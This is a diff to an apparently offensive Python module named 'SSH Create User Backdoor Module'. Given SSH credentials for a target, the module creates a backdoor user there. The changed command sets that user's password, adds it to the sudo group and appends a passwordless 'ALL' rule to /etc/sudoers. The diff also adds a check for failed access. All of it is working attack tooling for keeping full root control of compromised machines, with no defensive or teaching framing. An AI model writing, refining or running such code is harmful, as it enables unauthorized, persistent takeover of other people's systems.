@@ -1,7 +1,7 @@
 '''
 name : SSH Create User Backdoor Module
 description : This module creates a new user on the target system with SSH access.
-version : 1.0
+version : 1.1
 author : Ayato
 '''
 
@@ -31,9 +31,13 @@ def try_access(ip, username, password, cmd):
         return False
 
 def try_create_user(ip, username, password, backdoor_username, backdoor_password, echo_cmd):
-    cmd = f'{echo_cmd} && sudo useradd -m -p $(openssl passwd -1 {backdoor_password}) {backdoor_username} && sudo usermod -aG sudo {backdoor_username} && echo "{backdoor_username} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers && echo "User {backdoor_username} created with sudo privileges."'
+    #cmd = f'{echo_cmd} && sudo useradd -m -p $(openssl passwd -1 {backdoor_password}) {backdoor_username} && sudo usermod -aG sudo {backdoor_username} && echo "{backdoor_username} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers && echo "User {backdoor_username} created with sudo privileges."'
+    # sudo useradd -m username && echo 'username:password' | sudo chpasswd
+    cmd = f'{echo_cmd} && sudo useradd -m {backdoor_username} && echo "{backdoor_username}:{backdoor_password}" | sudo chpasswd && sudo usermod -aG sudo {backdoor_username} && echo "{backdoor_username} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers && echo "created"'
     print(f"[*] Attempting to create backdoor user {backdoor_username} on {ip}")
     result = try_access(ip, username, password, cmd)
+    if result == False:
+        return False
     if "created" in result:
         print(f"[+] Backdoor user {backdoor_username} created successfully on {ip}")
         return True
